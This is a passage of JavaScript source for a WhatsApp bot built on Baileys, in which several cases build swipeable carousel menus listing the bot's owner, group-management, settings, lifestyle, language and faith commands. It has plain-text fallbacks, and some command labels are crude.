            }
        }

        const commonHeader = {
            title: `${botName.toUpperCase()} • AUTO FEATURES`,
            hasMediaAttachment: !!preparedImage,
            ...(preparedImage ? { imageMessage: preparedImage } : {})
        };

        const cards = [
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 🤖 AUTO FEATURES (1/2) ⟫═╗
╠❏ ${prefix}autotyping on/off
╠❏ ${prefix}composing on/off
╠❏ ${prefix}autorecordaudio on/off
╠❏ ${prefix}autorecordvideo on/off
╠❏ ${prefix}autorecording on/off
╠❏ ${prefix}recording on/off
╠❏ ${prefix}alwaysonline on/off
╠❏ ${prefix}autoreact on/off
╚══════════════════╝` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '⚙️ Manage Auto',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 🤖 AUTO FEATURES (2/3) ⟫═╗
╠❏ ${prefix}autoread on/off
╠❏ ${prefix}autostatus on/off
╠❏ ${prefix}autolike on/off
╠❏ ${prefix}statuslikeemoji <emoji>
╠❏ ${prefix}anticall on/off
╠❏ ${prefix}chatbot on/off
╠❏ ${prefix}antimsg on/off
╚══════════════════╝` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '⚙️ Status Settings',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 🤖 AUTO FEATURES (3/3) ⟫═╗
╠❏ ${prefix}autoforwardstatus on/off
╠❏ ${prefix}autostatustext <text>
╠❏ ${prefix}statusviewerstatus
╠❏ ${prefix}autoread on/off
╠❏ ${prefix}autoviewstatus on/off
╠❏ ${prefix}autolikestatus on/off
╚══════════════════╝
❤️ Status Like Emoji: configurable
👁️ Auto-views all contacts' statuses` },
                footer: { text: 'Enable/disable with: command on/off' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '🔙 Main Menu',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.repo'
                        })
                    }]
                }
            }
        ];

        // Build carousel message
        const interactiveMsg = generateWAMessageFromContent(
            chatId,
            {
                interactiveMessage: {
                    body: { text: `🤖 *${botName.toUpperCase()} - AUTO FEATURES*` },
                    footer: { text: `Swipe ➡️ to see all ${cards.length} pages` },
                    carouselMessage: { cards },
                    contextInfo: {}
                }
            },
            {} // No quoted
        );

        await mzazi.relayMessage(chatId, interactiveMsg.message, {
            messageId: interactiveMsg.key.id
        });

    } catch (error) {
        logger.error('Auto features carousel error:', error);
        // Fallback plain text list
        let fallbackAuto = `🤖 *${botName.toUpperCase()} - AUTO FEATURES*\n\n`;
        fallbackAuto += `👁️ *Auto Status View*\n• ${prefix}autostatus on/off\n\n`;
        fallbackAuto += `❤️ *Auto Status Like*\n• ${prefix}autolike on/off\n• ${prefix}statuslikeemoji <emoji>\n\n`;
        fallbackAuto += `📊 *Status Info*\n• ${prefix}statusviewerstatus\n\n`;
        const autoCommands2 = [
            "autotyping", "composing", "autorecordaudio", "autorecordvideo", "autorecording",
            "recording", "alwaysonline", "autoreact", "autoread",
            "anticall", "chatbot", "antimsg", "autoforwardstatus"
        ];
        fallbackAuto += `Other auto commands:\n`;
        autoCommands2.forEach(cmd => { fallbackAuto += `• ${prefix}${cmd}\n`; });
        fallbackAuto += `\nUse: command on/off to enable/disable.\n© ${botName}`;
        await mzazireply(fallbackAuto);
    }
    break;
}

//=====================================//

case "ownermenu": {
    const chatId = sender;
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    try {
        // Load menu image
        const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
        const defaultMenuPic = "./media/menu.jpg";
        const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;

        let preparedImage = null;
        if (fs.existsSync(menuPicPath)) {
            const imageBuffer = fs.readFileSync(menuPicPath);
            const imgContent = await generateWAMessageContent(
                { image: imageBuffer },
                { upload: mzazi.waUploadToServer }
            );
            if (imgContent?.imageMessage) {
                preparedImage = imgContent.imageMessage;
            }
        }

        const commonHeader = {
            title: `${botName.toUpperCase()} • OWNER COMMANDS`,
            hasMediaAttachment: !!preparedImage,
            ...(preparedImage ? { imageMessage: preparedImage } : {})
        };

        const cards = [
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 👑 OWNER COMMANDS (1/4) ⟫═╗
╠❏ ${prefix}leave  
╠❏ ${prefix}public  
╠❏ ${prefix}self
╠❏ ${prefix}setprefix  
╠❏ ${prefix}changebotname
╠❏ ${prefix}addpaid  
╠❏ ${prefix}delpaid  
╠❏ ${prefix}listpaid
╠❏ ${prefix}addprem  
╠❏ ${prefix}delprem  
╠❏ ${prefix}addowner
╠❏ ${prefix}delowner  
╠❏ ${prefix}owners  
╠❏ ${prefix}listowners
╚══════════════════╝` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '👑 Owner Area',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 👑 OWNER COMMANDS (2/4) ⟫═╗
╠❏ ${prefix}setbotpic  
╠❏ ${prefix}changebotpic
╠❏ ${prefix}setbio  
╠❏ ${prefix}setbotname  
╠❏ ${prefix}setbotbio
╠❏ ${prefix}broadcast  
╠❏ ${prefix}broadcastdm
╠❏ ${prefix}block  
╠❏ ${prefix}unblock  
╠❏ ${prefix}sendmsg
╠❏ ${prefix}listgroups  
╠❏ ${prefix}leaveall  
╠❏ ${prefix}joingroup
╚══════════════════╝` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '👑 Owner Area',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 👑 OWNER COMMANDS (3/4) ⟫═╗
╠❏ ${prefix}botstatus  
╠❏ ${prefix}restart  
╠❏ ${prefix}shutdown
╠❏ ${prefix}setmode  
╠❏ ${prefix}resetbot  
╠❏ ${prefix}botmode
╠❏ ${prefix}downloadfile  
╠❏ ${prefix}addcase  
╠❏ ${prefix}delcase
╠❏ ${prefix}listcase  
╠❏ ${prefix}getcase  
╠❏ ${prefix}allcmds
╚══════════════════╝` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '👑 Owner Area',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 👑 OWNER COMMANDS (4/4) ⟫═╗
╠❏ ${prefix}eval  
╠❏ ${prefix}exec  
╠❏ ${prefix}readfile
╠❏ ${prefix}writefile  
╠❏ ${prefix}deletefile  
╠❏ ${prefix}listfiles
╠❏ ${prefix}memory  
╠❏ ${prefix}sendstatus  
╠❏ ${prefix}sendall
╠❏ ${prefix}connect  
╠❏ ${prefix}idch  
╠❏ ${prefix}repo
╠❏ ${prefix}listgroup  
╠❏ ${prefix}groupnames
╚══════════════════╝` },
                footer: { text: 'Owner only commands' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '🔙 Main Menu',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.repo'
                        })
                    }]
                }
            }
        ];

        // Build carousel message
        const interactiveMsg = generateWAMessageFromContent(
            chatId,
            {
                interactiveMessage: {
                    body: { text: `👑 *${botName.toUpperCase()} - OWNER COMMANDS*` },
                    footer: { text: `Swipe ➡️ to see all ${cards.length} pages` },
                    carouselMessage: { cards },
                    contextInfo: {}
                }
            },
            {} // No quoted
        );

        await mzazi.relayMessage(chatId, interactiveMsg.message, {
            messageId: interactiveMsg.key.id
        });

    } catch (error) {
        logger.error('Owner commands carousel error:', error);
        // Fallback plain text list
        const ownerCommands = [
            "leave", "public", "self", "setprefix", "changebotname", "addpaid", "delpaid",
            "listpaid", "addprem", "delprem", "addowner", "delowner", "owners", "listowners",
            "setbotpic", "changebotpic", "setbio", "setbotname", "setbotbio", "broadcast",
            "broadcastdm", "block", "unblock", "sendmsg", "listgroups", "leaveall", "joingroup",
            "botstatus", "restart", "shutdown", "setmode", "resetbot", "botmode", "downloadfile",
            "addcase", "delcase", "listcase", "getcase", "allcmds", "eval", "exec", "readfile",
            "writefile", "deletefile", "listfiles", "memory", "sendstatus", "sendall", "connect",
            "idch", "repo", "listgroup", "groupnames"
        ];
        let fallback = `👑 *${botName.toUpperCase()} - OWNER COMMANDS*\n\n`;
        ownerCommands.forEach(cmd => { fallback += `• ${prefix}${cmd}\n`; });
        fallback += `\n⚠️ These commands are restricted to bot owner.\n© ${botName}`;
        await mzazireply(fallback);
    }
    break;
}
//=====================================//

case "groupmenu": {
    const chatId = sender;
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    try {
        // Load menu image
        const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
        const defaultMenuPic = "./media/menu.jpg";
        const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;

        let preparedImage = null;
        if (fs.existsSync(menuPicPath)) {
            const imageBuffer = fs.readFileSync(menuPicPath);
            const imgContent = await generateWAMessageContent(
                { image: imageBuffer },
                { upload: mzazi.waUploadToServer }
            );
            if (imgContent?.imageMessage) {
                preparedImage = imgContent.imageMessage;
            }
        }

        const commonHeader = {
            title: `${botName.toUpperCase()} • GROUP MANAGEMENT`,
            hasMediaAttachment: !!preparedImage,
            ...(preparedImage ? { imageMessage: preparedImage } : {})
        };

        const cards = [
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 👥 GROUP MANAGEMENT (1/4) ⟫═╗
╠❏ ${prefix}kick  
╠❏ ${prefix}add  
╠❏ ${prefix}promote
╠❏ ${prefix}demote  
╠❏ ${prefix}mute  
╠❏ ${prefix}unmute
╠❏ ${prefix}tagall  
╠❏ ${prefix}hidetag  
╠❏ ${prefix}tagmembers
╠❏ ${prefix}tagadmin  
╠❏ ${prefix}mentionadmin
╠❏ ${prefix}groupinfo  
╠❏ ${prefix}members  
╠❏ ${prefix}count
╠❏ ${prefix}admins  
╠❏ ${prefix}groupstats  
╠❏ ${prefix}groupage
╚══════════════════╝` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '👥 Manage Group',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 👥 GROUP MANAGEMENT (2/4) ⟫═╗
╠❏ ${prefix}link  
╠❏ ${prefix}revoke  
╠❏ ${prefix}invitelink
╠❏ ${prefix}delete  
╠❏ ${prefix}d  
╠❏ ${prefix}del
╠❏ ${prefix}setrules  
╠❏ ${prefix}rules  
╠❏ ${prefix}topic
╠❏ ${prefix}warn  
╠❏ ${prefix}warnlist  
╠❏ ${prefix}resetwarn
╠❏ ${prefix}mywarn  
╠❏ ${prefix}clearwarn  
╠❏ ${prefix}warning2
╠❏ ${prefix}open  
╠❏ ${prefix}close  
╠❏ ${prefix}subject
╚══════════════════╝` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '👥 Manage Group',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 👥 GROUP MANAGEMENT (3/4) ⟫═╗
╠❏ ${prefix}setdesc  
╠❏ ${prefix}lockgroup  
╠❏ ${prefix}unlockgroup
╠❏ ${prefix}approve  
╠❏ ${prefix}reject  
╠❏ ${prefix}approveall
╠❏ ${prefix}rejectall  
╠❏ ${prefix}pendingrequests
╠❏ ${prefix}welcome  
╠❏ ${prefix}goodbye  
╠❏ ${prefix}kickall
╠❏ ${prefix}poll  
╠❏ ${prefix}groupid  
╠❏ ${prefix}groupstatus
╠❏ ${prefix}disappear  
╠❏ ${prefix}pin  
╠❏ ${prefix}muteall
╚══════════════════╝` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '👥 Manage Group',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 👥 GROUP MANAGEMENT (4/4) ⟫═╗
╠❏ ${prefix}isadmin  
╠❏ ${prefix}isingroup  
╠❏ ${prefix}announce
╠❏ ${prefix}notice  
╠❏ ${prefix}mute2  
╠❏ ${prefix}unmute2
╠❏ ${prefix}wantam  
╠❏ ${prefix}fuckmzazi  
╠❏ ${prefix}fuckruto
╠❏ ${prefix}mzaziwipeall  
╠❏ ${prefix}kickall
╚══════════════════╝` },
                footer: { text: 'All group commands' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '🔙 Main Menu',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.repo'
                        })
                    }]
                }
            }
        ];

        // Build carousel message
        const interactiveMsg = generateWAMessageFromContent(
            chatId,
            {
                interactiveMessage: {
                    body: { text: `👥 *${botName.toUpperCase()} - GROUP MANAGEMENT*` },
                    footer: { text: `Swipe ➡️ to see all ${cards.length} pages` },
                    carouselMessage: { cards },
                    contextInfo: {}
                }
            },
            {} // No quoted
        );

        await mzazi.relayMessage(chatId, interactiveMsg.message, {
            messageId: interactiveMsg.key.id
        });

    } catch (error) {
        logger.error('Group management carousel error:', error);
        // Fallback plain text list
        const groupCommands = [
            "kick", "add", "promote", "demote", "mute", "unmute", "tagall", "hidetag", "tagmembers",
            "tagadmin", "mentionadmin", "groupinfo", "members", "count", "admins", "groupstats",
            "groupage", "link", "revoke", "invitelink", "delete", "d", "del", "setrules", "rules",
            "topic", "warn", "warnlist", "resetwarn", "mywarn", "clearwarn", "warning2", "open",
            "close", "subject", "setdesc", "lockgroup", "unlockgroup", "approve", "reject", "approveall",
            "rejectall", "pendingrequests", "welcome", "goodbye", "kickall", "poll", "groupid",
            "groupstatus", "disappear", "pin", "muteall", "isadmin", "isingroup", "announce",
            "notice", "mute2", "unmute2", "wantam", "fuckmzazi", "fuckruto", "mzaziwipeall"
        ];
        let fallback = `👥 *${botName.toUpperCase()} - GROUP MANAGEMENT*\n\n`;
        groupCommands.forEach(cmd => { fallback += `• ${prefix}${cmd}\n`; });
        fallback += `\n© ${botName}`;
        await mzazireply(fallback);
    }
    break;
}
//=====================================//

case "languagemenu": {
    const chatId = sender;
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    try {
        // Load menu image
        const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
        const defaultMenuPic = "./media/menu.jpg";
        const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;

        let preparedImage = null;
        if (fs.existsSync(menuPicPath)) {
            const imageBuffer = fs.readFileSync(menuPicPath);
            const imgContent = await generateWAMessageContent(
                { image: imageBuffer },
                { upload: mzazi.waUploadToServer }
            );
            if (imgContent?.imageMessage) {
                preparedImage = imgContent.imageMessage;
            }
        }

        const commonHeader = {
            title: `${botName.toUpperCase()} • LANGUAGES`,
            hasMediaAttachment: !!preparedImage,
            ...(preparedImage ? { imageMessage: preparedImage } : {})
        };

        const cards = [
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 🌐 LANGUAGES ⟫═╗
╠❏ ${prefix}swahili  
╠❏ ${prefix}french  
╠❏ ${prefix}spanish
╠❏ ${prefix}arabic  
╠❏ ${prefix}translate
╚══════════════════╝` },
                footer: { text: 'Translate between languages' },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'cta_url',
                            buttonParamsJson: JSON.stringify({
                                display_text: '🌍 Translate Now',
                                url: 'https://wa.me/' + botPhoneNum + '?text=.translate'
                            })
                        },
                        {
                            name: 'cta_url',
                            buttonParamsJson: JSON.stringify({
                                display_text: '🔙 Main Menu',
                                url: 'https://wa.me/' + botPhoneNum + '?text=.repo'
                            })
                        }
                    ]
                }
            }
        ];

        // Build carousel message
        const interactiveMsg = generateWAMessageFromContent(
            chatId,
            {
                interactiveMessage: {
                    body: { text: `🌐 *${botName.toUpperCase()} - LANGUAGE TOOLS*` },
                    footer: { text: `Tap a command to use it` },
                    carouselMessage: { cards },
                    contextInfo: {}
                }
            },
            {} // No quoted
        );

        await mzazi.relayMessage(chatId, interactiveMsg.message, {
            messageId: interactiveMsg.key.id
        });

    } catch (error) {
        logger.error('Languages menu carousel error:', error);
        // Fallback plain text
        const fallback = `🌐 *${botName.toUpperCase()} - LANGUAGES*\n\n• ${prefix}swahili\n• ${prefix}french\n• ${prefix}spanish\n• ${prefix}arabic\n• ${prefix}translate\n\n© ${botName}`;
        await mzazireply(fallback);
    }
    break;
}
//=====================================//

case "settingsmenu": {
    const chatId = sender;
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    try {
        // Load menu image
        const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
        const defaultMenuPic = "./media/menu.jpg";
        const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;

        let preparedImage = null;
        if (fs.existsSync(menuPicPath)) {
            const imageBuffer = fs.readFileSync(menuPicPath);
            const imgContent = await generateWAMessageContent(
                { image: imageBuffer },
                { upload: mzazi.waUploadToServer }
            );
            if (imgContent?.imageMessage) {
                preparedImage = imgContent.imageMessage;
            }
        }

        const commonHeader = {
            title: `${botName.toUpperCase()} • BOT SETTINGS`,
            hasMediaAttachment: !!preparedImage,
            ...(preparedImage ? { imageMessage: preparedImage } : {})
        };

        const cards = [
            {
                header: commonHeader,
                body: { text: `
╔═⟪ ⚙️ BOT SETTINGS (1/2) ⟫═╗
╠❏ ${prefix}botmode  
╠❏ ${prefix}setmode  
╠❏ ${prefix}setprefix
╠❏ ${prefix}version  
╠❏ ${prefix}changelog  
╠❏ ${prefix}update
╠❏ ${prefix}server  
╠❏ ${prefix}node  
╠❏ ${prefix}cpu
╠❏ ${prefix}hostname  
╠❏ ${prefix}platform  
╠❏ ${prefix}uptime3
╚══════════════════╝` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '⚙️ Bot Settings',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ ⚙️ BOT SETTINGS (2/2) ⟫═╗
╠❏ ${prefix}creator  
╠❏ ${prefix}contact 
╠❏ ${prefix}support
╠❏ ${prefix}faq  
╠❏ ${prefix}plan  
╠❏ ${prefix}donate
╠❏ ${prefix}social  
╠❏ ${prefix}source
╚══════════════════╝` },
                footer: { text: 'Info & support' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '🔙 Main Menu',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.repo'
                        })
                    }]
                }
            }
        ];

        // Build carousel message
        const interactiveMsg = generateWAMessageFromContent(
            chatId,
            {
                interactiveMessage: {
                    body: { text: `⚙️ *${botName.toUpperCase()} - BOT SETTINGS*` },
                    footer: { text: `Swipe ➡️ to see all ${cards.length} pages` },
                    carouselMessage: { cards },
                    contextInfo: {}
                }
            },
            {} // No quoted
        );

        await mzazi.relayMessage(chatId, interactiveMsg.message, {
            messageId: interactiveMsg.key.id
        });

    } catch (error) {
        logger.error('Bot settings carousel error:', error);
        // Fallback plain text list
        const settingsCommands = [
            "botmode", "setmode", "setprefix", "version", "changelog", "update", "server",
            "node", "cpu", "hostname", "platform", "uptime3", "creator", "contact", "support",
            "faq", "plan", "donate", "social", "source"
        ];
        let fallback = `⚙️ *${botName.toUpperCase()} - BOT SETTINGS*\n\n`;
        settingsCommands.forEach(cmd => { fallback += `• ${prefix}${cmd}\n`; });
        fallback += `\n© ${botName}`;
        await mzazireply(fallback);
    }
    break;
}
//=====================================//

case "lifestylemenu": {
    const chatId = sender;
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    try {
        // Load menu image
        const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
        const defaultMenuPic = "./media/menu.jpg";
        const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;

        let preparedImage = null;
        if (fs.existsSync(menuPicPath)) {
            const imageBuffer = fs.readFileSync(menuPicPath);
            const imgContent = await generateWAMessageContent(
                { image: imageBuffer },
                { upload: mzazi.waUploadToServer }
            );
            if (imgContent?.imageMessage) {
                preparedImage = imgContent.imageMessage;
            }
        }

        const commonHeader = {
            title: `${botName.toUpperCase()} • LIFESTYLE`,
            hasMediaAttachment: !!preparedImage,
            ...(preparedImage ? { imageMessage: preparedImage } : {})
        };

        const cards = [
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 💪 LIFESTYLE (1/3) ⟫═╗
╠❏ ${prefix}health  
╠❏ ${prefix}mentalhealth  
╠❏ ${prefix}sleep
╠❏ ${prefix}water  
╠❏ ${prefix}meditation  
╠❏ ${prefix}fitness
╠❏ ${prefix}workout  
╠❏ ${prefix}stretching  
╠❏ ${prefix}food
╠❏ ${prefix}drink  
╠❏ ${prefix}calories  
╠❏ ${prefix}recipe
╚══════════════════╝` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '💪 Healthy Living',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 💰 LIFESTYLE (2/3) ⟫═╗
╠❏ ${prefix}money  
╠❏ ${prefix}invest  
╠❏ ${prefix}business
╠❏ ${prefix}entrepreneur  
╠❏ ${prefix}savings
╠❏ ${prefix}study  
╠❏ ${prefix}learn  
╠❏ ${prefix}codingtip
╠❏ ${prefix}programming  
╠❏ ${prefix}code
╚══════════════════╝` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '💰 Finance & Learning',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ ⚽ LIFESTYLE (3/3) ⟫═╗
╠❏ ${prefix}sport  
╠❏ ${prefix}football  
╠❏ ${prefix}basketball
╠❏ ${prefix}chess  
╠❏ ${prefix}game2  
╠❏ ${prefix}boxing
╠❏ ${prefix}relationship  
╠❏ ${prefix}friendship  
╠❏ ${prefix}advice2
╚══════════════════╝` },
                footer: { text: 'Sports & relationships' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '🔙 Main Menu',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.repo'
                        })
                    }]
                }
            }
        ];

        // Build carousel message
        const interactiveMsg = generateWAMessageFromContent(
            chatId,
            {
                interactiveMessage: {
                    body: { text: `💪 *${botName.toUpperCase()} - LIFESTYLE*` },
                    footer: { text: `Swipe ➡️ to see all ${cards.length} pages` },
                    carouselMessage: { cards },
                    contextInfo: {}
                }
            },
            {} // No quoted
        );

        await mzazi.relayMessage(chatId, interactiveMsg.message, {
            messageId: interactiveMsg.key.id
        });

    } catch (error) {
        logger.error('Lifestyle menu carousel error:', error);
        // Fallback plain text list
        const lifestyleCommands = [
            "health", "mentalhealth", "sleep", "water", "meditation", "fitness", "workout",
            "stretching", "food", "drink", "calories", "recipe", "money", "invest", "business",
            "entrepreneur", "savings", "study", "learn", "codingtip", "programming", "code",
            "sport", "football", "basketball", "chess", "game2", "boxing", "relationship",
            "friendship", "advice2"
        ];
        let fallback = `💪 *${botName.toUpperCase()} - LIFESTYLE*\n\n`;
        lifestyleCommands.forEach(cmd => { fallback += `• ${prefix}${cmd}\n`; });
        fallback += `\n© ${botName}`;
        await mzazireply(fallback);
    }
    break;
}
//=====================================//

case "faithmenu": {
    const chatId = sender;
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    try {
        // Load menu image
        const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
        const defaultMenuPic = "./media/menu.jpg";
        const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;

        let preparedImage = null;
        if (fs.existsSync(menuPicPath)) {
            const imageBuffer = fs.readFileSync(menuPicPath);
            const imgContent = await generateWAMessageContent(
                { image: imageBuffer },
                { upload: mzazi.waUploadToServer }
            );
            if (imgContent?.imageMessage) {
                preparedImage = imgContent.imageMessage;
            }
        }

        const commonHeader = {
            title: `${botName.toUpperCase()} • FAITH`,
            hasMediaAttachment: !!preparedImage,
            ...(preparedImage ? { imageMessage: preparedImage } : {})
        };

        const cards = [
            {
                header: commonHeader,
                body: { text: `
╔═⟪ ☪️✝️ FAITH ⟫═╗
╠❏ ${prefix}allah  
╠❏ ${prefix}bismillah  
╠❏ ${prefix}alhamdulillah
╠❏ ${prefix}inshallah  
╠❏ ${prefix}mashallah  
╠❏ ${prefix}dua
╠❏ ${prefix}quran  
╠❏ ${prefix}hadith  
╠❏ ${prefix}pray
╠❏ ${prefix}bible  
╠❏ ${prefix}verse  
╠❏ ${prefix}eid
╠❏ ${prefix}ramadan  
╠❏ ${prefix}christmas  
╠❏ ${prefix}newyear
╚══════════════════╝` },
                footer: { text: 'Islamic & Christian guidance' },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'cta_url',
                            buttonParamsJson: JSON.stringify({
                                display_text: '🕋 Spiritual Guidance',
                                url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                            })
                        },
                        {
                            name: 'cta_url',
                            buttonParamsJson: JSON.stringify({
                                display_text: '🔙 Main Menu',
                                url: 'https://wa.me/' + botPhoneNum + '?text=.repo'
                            })
                        }
                    ]
                }
            }
        ];

        // Build carousel message
        const interactiveMsg = generateWAMessageFromContent(
            chatId,
            {
                interactiveMessage: {
                    body: { text: `🕋 *${botName.toUpperCase()} - FAITH & PRAYER*` },
                    footer: { text: `Tap a command for spiritual content` },
                    carouselMessage: { cards },
                    contextInfo: {}
                }
            },
            {} // No quoted
        );

        await mzazi.relayMessage(chatId, interactiveMsg.message, {
            messageId: interactiveMsg.key.id
        });

    } catch (error) {
        logger.error('Faith menu carousel error:', error);
        // Fallback plain text list
        const faithCommands = [
            "allah", "bismillah", "alhamdulillah", "inshallah", "mashallah", "dua", "quran",
            "hadith", "pray", "bible", "verse", "eid", "ramadan", "christmas", "newyear"
        ];
        let fallback = `🕋 *${botName.toUpperCase()} - FAITH & PRAYER*\n\n`;
        faithCommands.forEach(cmd => { fallback += `• ${prefix}${cmd}\n`; });
        fallback += `\n© ${botName}`;
        await mzazireply(fallback);
    }
    break;
}

//=====================================//



//=====================================//

case 'maria': {
    const chatId = sender;
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    try {
        // Load premium owner menu image
        const customOwnerPic = `./database/sessions/${botPhoneNum}/owner.jpg`;
        const defaultOwnerPic = "./media/owner.jpg";
        const ownerPicPath = fs.existsSync(customOwnerPic) ? customOwnerPic : defaultOwnerPic;

        let preparedImage = null;
        if (fs.existsSync(ownerPicPath)) {
            const imageBuffer = fs.readFileSync(ownerPicPath);
            const imgContent = await generateWAMessageContent(
                { image: imageBuffer },
                { upload: mzazi.waUploadToServer }
            );
            if (imgContent?.imageMessage) {
                preparedImage = imgContent.imageMessage;
            }
        }

        // Get bot statistics
        const uptime = process.uptime();
        const days = Math.floor(uptime / 86400);
        const hours = Math.floor((uptime % 86400) / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);
        const seconds = Math.floor(uptime % 60);
        const uptimeString = `${days}d ${hours}h ${minutes}m ${seconds}s`;

        const ping = Date.now() - msg.messageTimestamp * 1000;
        const totalGroups = Object.keys(global.db.data.chats || {}).length;
        const totalUsers = Object.keys(global.db.data.users || {}).length;
        const totalCommands = Object.keys(global.plugins || {}).length;

        // Owner info
        const ownerName = global.ownerName || 'Elite Developer';
        const ownerNumber = global.ownerNumber || '254700000000';
        const botVersion = global.botVersion || '3.0.0';

        const commonHeader = {
            title: `${botName.toUpperCase()} • OWNER PANEL`,
            hasMediaAttachment: !!preparedImage,
            ...(preparedImage ? { imageMessage: preparedImage } : {})
        };

        // Create 5 premium cards with owner commands
        const cards = [
            // Page 1: PREMIUM MANAGEMENT
            {
                header: commonHeader,
                body: { text: `
╔═══════════════════╗
║   👑 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧   ║
╠═══════════════════╣
